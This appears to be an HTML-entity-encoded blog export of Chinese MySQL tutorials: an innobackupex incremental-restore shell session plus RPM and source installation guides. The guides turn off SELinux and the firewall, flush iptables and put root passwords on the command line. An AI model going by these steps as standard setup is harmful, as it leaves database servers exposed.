root 150 Apr 24 22:26 TESTDB666-rw-r----- 1 root root 482 Apr 24 22:26 xtrabackup_info[root@server12 ~]# chown -Rf mysql:mysql /var/lib/mysql[root@server12 ~]# ll /var/lib/mysql total 13912drwxr-x--- 2 mysql mysql 88 Apr 24 22:26 BOOK-rw-r----- 1 mysql mysql 315 Apr 24 22:26 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 22:26 ibdata1-rw-r----- 1 mysql mysql 1622016 Apr 24 22:26 ibdata1.delta-rw-r----- 1 mysql mysql 60 Apr 24 22:26 ibdata1.metadrwxr-x--- 2 mysql mysql 4096 Apr 24 22:26 mysqldrwxr-x--- 2 mysql mysql 8192 Apr 24 22:26 performance_schemadrwxr-x--- 2 mysql mysql 8192 Apr 24 22:26 sysdrwxr-x--- 2 mysql mysql 88 Apr 24 22:26 testbookdbdrwxr-x--- 2 mysql mysql 92 Apr 24 22:26 TESTDBdrwxr-x--- 2 mysql mysql 150 Apr 24 22:26 TESTDB666-rw-r----- 1 mysql mysql 482 Apr 24 22:26 xtrabackup_info[root@server12 ~]# systemctl start mysqld[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || TESTDB || TESTDB666 || mysql || performance_schema || sys || testbookdb |+--------------------+8 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB666;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+---------------------+| Tables_in_TESTDB666 |+---------------------+| TABLE1 || TABLE2 |+---------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE1&apos; doesn&apos;t existmysql&gt; select * from TABLE2;ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE2&apos; doesn&apos;t existmysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1 || TABLE2 |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH || 7 | MySQL4 | 74 | QH || 8 | MySQL5 | 75 | QH || 9 | MySQL6 | 76 | QH || 10 | MySQL7 | 77 | QH || 11 | MySQL8 | 78 | QH || 12 | MySQL9 | 79 | QH |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name | price | pages |+--------+-------+-------+| Linux | 30 | 666 || CLD | 60 | 666 || SYS | 80 | 666 || MySQL1 | 166 | 666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; ^DBye 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@server12 ~]#[root@server12 ~]# ll /mysql-all-data/total 110632-rw-r----- 1 mysql mysql 56 Apr 23 05:15 auto.cnfdrwxr-x--- 2 mysql mysql 88 Apr 24 21:26 BOOK-rw-r----- 1 mysql mysql 343 Apr 24 21:51 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1drwxr-x--- 2 mysql mysql 4096 Apr 23 05:14 mysqldrwxr-x--- 2 mysql mysql 8192 Apr 23 05:14 performance_schemadrwxr-x--- 2 mysql mysql 8192 Apr 23 05:14 sysdrwxr-x--- 2 mysql mysql 88 Apr 23 05:14 testbookdbdrwxr-x--- 2 mysql mysql 92 Apr 24 21:28 TESTDB-rw-r----- 1 mysql mysql 472 Apr 23 05:14 xtrabackup_info[root@server12 ~]# systemctl stop mysqld[root@server12 ~]# rm -rf /var/lib/mysql/*[root@server12 ~]# mv /mysql-all-data/* /var/lib/mysql[root@server12 ~]# ll /var/lib/mysqltotal 110632-rw-r----- 1 mysql mysql 56 Apr 23 05:15 auto.cnfdrwxr-x--- 2 mysql mysql 88 Apr 24 21:26 BOOK-rw-r----- 1 mysql mysql 343 Apr 24 21:51 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1drwxr-x--- 2 mysql mysql 4096 Apr 23 05:14 mysqldrwxr-x--- 2 mysql mysql 8192 Apr 23 05:14 performance_schemadrwxr-x--- 2 mysql mysql 8192 Apr 23 05:14 sysdrwxr-x--- 2 mysql mysql 88 Apr 23 05:14 testbookdbdrwxr-x--- 2 mysql mysql 92 Apr 24 21:28 TESTDB-rw-r----- 1 mysql mysql 472 Apr 23 05:14 xtrabackup_info[root@server12 ~]# systemctl start mysqld[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || TESTDB || mysql || performance_schema || sys || testbookdb |+--------------------+7 rows in set (0.01 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1 || TABLE2 |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH || 7 | MySQL4 | 74 | QH || 8 | MySQL5 | 75 | QH || 9 | MySQL6 | 76 | QH || 10 | MySQL7 | 77 | QH || 11 | MySQL8 | 78 | QH || 12 | MySQL9 | 79 | QH |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name | price | pages |+--------+-------+-------+| Linux | 30 | 666 || CLD | 60 | 666 || SYS | 80 | 666 || MySQL1 | 166 | 666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; ^DBye[root@server12 ~]# &#x7531;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;&#x53EF;&#x77E5;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x6570;&#x636E;&#x4E0D;&#x7A33;&#x5B9A;&#xFF01; 6&#xFF1A;&#x5B98;&#x65B9;&#x6587;&#x6863;https://www.percona.com/doc/percona-xtrabackup/2.4/index.html &#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md&#x94FE;&#x63A5;&#xFF1A;http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C &#x6587;&#x6863;&#xFF1A;16 innobackupex&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x9047;&#x5230;Can&#x2019;&#x2026;&#x94FE;&#x63A5;&#xFF1A;http://note.youdao.com/noteshare?id=75c497bba7496b9ec1c61c766e03cca8&amp;sub=F4A9B0EB5E554DB5BB6EF40A12A25512 &#x7EC3;&#x4E60;&#xFF1A;1. &#x628A;&#x6570;&#x636E;&#x5B57;&#x5178;&#x5BFC;&#x5165;MySQL&#x6570;&#x636E;&#x5E93; 2. MySQL5.7.20&#x5728;&#x7EBF;&#x5347;&#x7EA7;&#x5230;MySQL5.7.24 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"使用RPM包安装MySQL5.7数据库","date":"2022-06-07T04:44:03.000Z","path":"/posts/f6e2d114/","text":"&#x4F7F;&#x7528;rpm&#x5305;&#x5B89;&#x88C5;MySQL5.7&#x6570;&#x636E;&#x5E93; &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF; 1234567sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null &#x4E0A;&#x4F20;mysql&#x5B89;&#x88C5;&#x5305; 12tar -xvf mysql5.7.tar.gzcd mysql/ &#x5B89;&#x88C5; rpm -e &#x2013;nodeps mariadb-libs &#x2014;&#x2013;&#x5378;&#x8F7D;&#x673A;&#x5668;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305; rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;vim /etc/my.cnf &#x2014;&#x2013;&#x7F16;&#x8F91;myslq&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x672B;&#x5C3E;&#x589E;&#x52A0;&#x4E00;&#x4E0B;&#x8BED;&#x53E5;&#x4F18;&#x5316;&#x8FDE;&#x63A5;&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6; 12skip-name-resolveecho skip-name-resolve &gt;&gt; /etc/my.cnf &#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1; systemctl start mysqld systemctl status mysqld systemctl enable mysqld &#x83B7;&#x53D6;&#x968F;&#x673A;&#x7684;&#x521D;&#x59CB;&#x5BC6;&#x7801; (mysql5.7&#x5F00;&#x59CB;&#x7B2C;&#x4E00;&#x6B21;&#x4EA7;&#x751F;&#x968F;&#x673A;&#x5BC6;&#x7801;&#xFF0C;&#x4E14;&#x767B;&#x5F55;&#x540E;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;)12345cat /var/log/mysqld.log | grep &quot;password&quot;2021-01-09T07:10:18.431779Z 1 [Note] A temporary password is generated for root@localhost: -dhfHuf%p9hqnetstat -nlpt | grep mysqld -----mysqld &#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;3306tcp6 0 0 :::3306 :::* LISTEN 4434/mysqld &#x901A;&#x8FC7;mysql&#x547D;&lt;&#x5BA2;&#x6237;&#x7AEF;&gt;&#x767B;&#x5F55; mysqld&#x670D;&#x52A1;&#x5668;mysql -u &lt;&#x7528;&#x6237;&#x540D;&gt; -p &lt;&#x5BC6;&#x7801;&gt; -h &lt;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;IP,&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&gt; -P &lt;&#x7AEF;&#x53E3;,&#x9ED8;&#x8BA4;3306&gt;123mysql -uroot -pEnter password:mysql&gt; &#x8F93;&#x5165;sql&#x8BED;&#x53E5;&#x4E0E;mysqld&#x4EA4;&#x4E92; &#x4FEE;&#x6539;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&lt;&#x5BC6;&#x7801;&#x9700;&#x8981;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&gt;123mysql&gt; ALTER USER &apos;root&apos;@&apos;localhost&apos; identified by &quot;Uplooking_123&quot;;mysql&gt; flush privileges; ----&#x5237;&#x65B0;&#x6743;&#x9650;&#xFF0C;&#x7ACB;&#x5373;&#x751F;&#x6548;mysql&gt; quit rpm&#x5B89;&#x88C5;MySQL5.7&#x914D;&#x7F6E;&#x591A;&#x5B9E;&#x4F8B;&#x94FE;&#x63A5;&#xFF1A;https://note.youdao.com/s/LGwmlumI document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL5.7","date":"2022-06-07T04:43:47.000Z","path":"/posts/61fb6d52/","text":"&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.71. &#x5B89;&#x88C5;&#x4F9D;&#x8D56; Boost C++ &#x5E93;&#x4ECE;MySQL5.7&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x5B89;&#x88C5;MySQL&#x9700;&#x8981;&#x4F9D;&#x8D56; Boost &#x7684;C++&#x6269;&#x5C55;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x80FD;&#x662F; 1.59.0 &#x7248;&#x672C;&#x3002;Boost &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF08;&#x4EFB;&#x4E00;&#x5730;&#x5740;&#x90FD;&#x53EF;&#x4E0B;&#x8F7D;&#xFF09;&#xFF1A;http://www.boost.org/users/history &#xFF1B;https://www.boost.org/users/history/version_1_59_0.htmlhttps://sourceforge.net/projects/boost/files/boost/1.59.0/https://downloads.mysql.com/archives/get/p/23/file/mysql-boost-5.7.19.tar.gz&#x9009;&#x62E9;1.59.0&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#xFF0C;&#x5728;&#x7F16;&#x8BD1;&#x662F;&#x586B;&#x5199;&#x76F8;&#x5E94;&#x53C2;&#x6570;&#xFF0C;&#x6307;&#x5B9A;Boost&#x6E90;&#x7801;&#x4F4D;&#x7F6E;&#x5373;&#x53EF;&#x3002;Boost&#x5E93;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x3001;&#x63D0;&#x4F9B;&#x6E90;&#x4EE3;&#x7801;&#x7684;C++&#x5E93;&#xFF0C;&#x4F5C;&#x4E3A;&#x6807;&#x51C6;&#x5E93;&#x7684;&#x540E;&#x5907;&#xFF0C;&#x662F;C++&#x6807;&#x51C6;&#x5316;&#x8FDB;&#x7A0B;&#x7684;&#x5F00;&#x53D1;&#x5F15;&#x64CE;&#x4E4B;&#x4E00;&#x3002;Boost&#x5E93;&#x7531;C++&#x6807;&#x51C6;&#x59D4;&#x5458;&#x4F1A;&#x5E93;&#x5DE5;&#x4F5C;&#x7EC4;&#x6210;&#x5458;&#x53D1;&#x8D77;&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x4E9B;&#x5185;&#x5BB9;&#x6709;&#x671B;&#x6210;&#x4E3A;&#x4E0B;&#x4E00;&#x4EE3;C++&#x6807;&#x51C6;&#x5E93;&#x5185;&#x5BB9;&#x3002;&#x5728;C++&#x793E;&#x533A;&#x4E2D;&#x5F71;&#x54CD;&#x751A;&#x5927;&#xFF0C;&#x662F;&#x4E0D;&#x6298;&#x4E0D;&#x6263;&#x7684;&#x201C;&#x51C6;&#x201D;&#x6807;&#x51C6;&#x5E93;&#x3002;Boost&#x7531;&#x4E8E;&#x5176;&#x5BF9;&#x8DE8;&#x5E73;&#x53F0;&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x5BF9;&#x6807;&#x51C6;C++&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x4E0E;&#x7F16;&#x5199;&#x5E73;&#x53F0;&#x65E0;&#x5173;&#x3002; &#x4E0B;&#x8F7D;&#x89E3;&#x538B;Boost C++&#x5E93; wget http://sourceforge.net/projects/boost/files/boost/1.59.0/boost_1_59_0.tar.gz # &#x89E3;&#x538B;&#x5230;/usr/local/boost tar -zxvf boost_1_59_0.tar.gz mv boost_1_59_0 /usr/local/boost 2. &#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;yum install -y gcc-c++ cmake ncurses-devel 3. &#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;groupadd -g 27 mysql useradd mysql -u 27 -g mysql -M -s /sbin/nologin 4. &#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;mkdir -p /data/mysql chown -Rf mysql:mysql /data/mysql 5. &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL 5.7MySQL&#x5B98;&#x65B9;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://downloads.mysql.com/archives/community/ &#x4E0B;&#x8F7D; wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.19.tar.gz tar -zxvf mysql-5.7.19.tar.gz -C /usr/local/src &#x7F16;&#x8BD1;&#x5B89;&#x88C5; cd /usr/local/src/mysql-5.7.19 # &#x9884;&#x7F16;&#x8BD1; cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql57 -DMYSQL_DATADIR=/data/mysql -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DMYSQL_TCP_PORT=3306 -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DMYSQL_USER=mysql -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boost -DWITH_INNODB_MEMCACHED=ON ## &#x7F16;&#x8BD1;&#x5B89;&#x88C5; # &#x9ED8;&#x8BA4;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x975E;&#x5E38;&#x6162;&#xFF0C;&#x4E0D;&#x63A8;&#x8350; # &#x52A0;&#x901F;&#x7F16;&#x8BD1;&#x65B9;&#x6CD5;&#x770B;&#x6587;&#x672B;&#x64CD;&#x4F5C; make &amp;&amp; make install 6. &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;mv /etc/my.cnf /etc/my.cnf.bak 1234567891011121314151617cat &gt; /etc/my.cnf &lt;&lt;EOF[client]port=3306socket=/data/mysql/mysql.sock[mysqld]character-set-server=utf8collation-server=utf8_general_ciskip-name-resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog-error=/data/mysql/mysqld.logpid-file=/data/mysql/mysqld.pidEOF 7. &#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;12echo &quot;export PATH=\\$PATH:/usr/local/mysql57/bin&quot; &gt;&gt; /etc/profilesource /etc/profile 8. &#x521D;&#x59CB;&#x5316;MySQL 5.7/usr/local/mysql57/bin/mysqld --defaults-file=/etc/my.cnf --initialize --user=mysql 9. &#x8FD0;&#x884C;MySQL/usr/local/mysql57/support-files/mysql.server start /usr/local/mysql57/support-files/mysql.server status 10. &#x67E5;&#x627E;MySQL root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;cd /data/mysql cat mysqld.log | grep root 11. &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x4F7F;&#x7528;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;MySQL 12ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;New_password&apos;;FLUSH PRIVILEGES; 12. &#x521B;&#x5EFA;MySQL 5.7 systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;&#x53C2;&#x8003;&#xFF1A;https://dev.mysql.com/doc/refman/5.7/en/using-systemd.html 13. &#x7F16;&#x8BD1;&#x4F18;&#x5316;&#x5B89;&#x88C5;ccache&#x52A0;&#x5FEB;&#x7F16;&#x8BD1;&#x901F;&#x5EA6; yum install -y epel-release yum install -y ccache # &#x4F7F;&#x7528;ccache&#x63A5;&#x7BA1;gcc/g++ cp ccache /usr/local/bin/ ln -s ccache /usr/local/bin/gcc ln -s ccache /usr/local/bin/g++ ln -s ccache /usr/local/bin/cc ln -s ccache /usr/local/bin/c++ make -j&#x5E76;&#x884C;&#x7F16;&#x8BD1;CPU&#x662F;&#x5F71;&#x54CD;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x56E0;&#x7D20;make -j4 &#x8BA9;make&#x6700;&#x591A;&#x5141;&#x8BB8;4&#x4E2A;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;&#x540C;&#x65F6;&#x6267;&#x884C; &#x5728;&#x591A;&#x6838;CPU&#x4E0A;&#xFF0C;&#x9002;&#x5F53;&#x7684;&#x8FDB;&#x884C;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x660E;&#x663E;&#x63D0;&#x9AD8;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x3002;&#x4F46;&#x5E76;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x4E0D;&#x5B9C;&#x592A;&#x591A;&#xFF0C;make -j &#x4E00;&#x822C;&#x662F;&#x4EE5;CPU&#x7684;&#x6838;&#x5FC3;&#x6570;&#x76EE;&#x7684;&#x4E24;&#x500D;&#x4E3A;&#x5B9C;&#x3002; &#x6CE8;&#x610F;&#xFF01; &#x5728;&#x4F7F;&#x7528;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x548C;&#x4EA4;&#x6362;&#x5206;&#x533A;&#x7ED9;&#x5927;&#x4E00;&#x4E9B;&#xFF0C;&#x5185;&#x5B58;&#x8FC7;&#x5C0F;&#x65F6;&#xFF0C;&#x7F16;&#x8BD1;&#x4F1A;&#x51FA;&#x9519; ccache&#x5B98;&#x65B9;&#x6587;&#x6863;https://ccache.dev/manual/4.3.html &#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.71. &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/null setenforce 0 systemctl stop firewalld systemctl disable firewalld iptables -F systemctl stop NetworkManager &amp;&gt; /dev/null systemctl disable NetworkManager &amp;&gt; /dev/null 2. &#x83B7;&#x53D6;MySQL 5.7&#x7684;rpm&#x5305;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E00;&#xFF1A;MySQL&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;https://downloads.mysql.com/archives/community/&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E8C;&#xFF1A;copy&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x5305; &#x5206;&#x522B;&#x4E0B;&#x8F7D;&#x8FD9;5&#x4E2A;rpm&#x5305;&#xFF1A;MySQL&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;RPM Package, MySQL Server&#xFF1A;mysql-community-server-5.7.24-1.el7.x86_64.rpmMySQL&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;RPM Package, Client Utilities&#xFF1A;mysql-community-client-5.7.24-1.el7.x86_64.rpmMySQL&#x5F00;&#x53D1;&#x5E93;RPM Package, Development Libraries&#xFF1A;mysql-community-devel-5.7.24-1.el7.x86_64.rpmMySQL&#x914D;&#x7F6E;&#x7A0B;&#x5E8F;RPM Package, MySQL Configuration&#xFF1A;mysql-community-common-5.7.24-1.el7.x86_64.rpmMySQL&#x5171;&#x4EAB;&#x5E93;RPM Package, Shared Libraries&#xFF1A;mysql-community-libs-5.7.24-1.el7.x86_64.rpm 3. &#x5B89;&#x88C5;MySQL&#x5378;&#x8F7D;&#x7CFB;&#x7EDF;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305; rpm -e --nodeps mariadb-libs &#x5B89;&#x88C5;rpm&#x5305;&#x5B89;&#x88C5;&#x987A;&#x5E8F;&#xFF1A; rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm 4. &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;vim /etc/my.cnf # &#x672B;&#x884C;&#x6DFB;&#x52A0;skip-name-resolv&#xFF0C;&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6; skip-name-resolv &#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93; systemctl start mysqld systemctl status mysqld systemctl enable mysqld 5. &#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;cat /var/log/mysqld.log | grep &quot;password&quot; 6. &#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;&#x4F7F;&#x7528;MySQL root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93; 123456ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_PASSWORD&apos;;FLUSH PRIVILEGES;# &#x6216;&#x8005;update mysql.user set authentication_string=password(&apos;123456&apos;) where user=&apos;root&apos; and Host = &apos;localhost&apos;;# &#x6216;&#x8005;set password for &apos;root&apos;@&apos;localhost&apos;=password(&apos;123456&apos;); &#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;&#x5728;&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 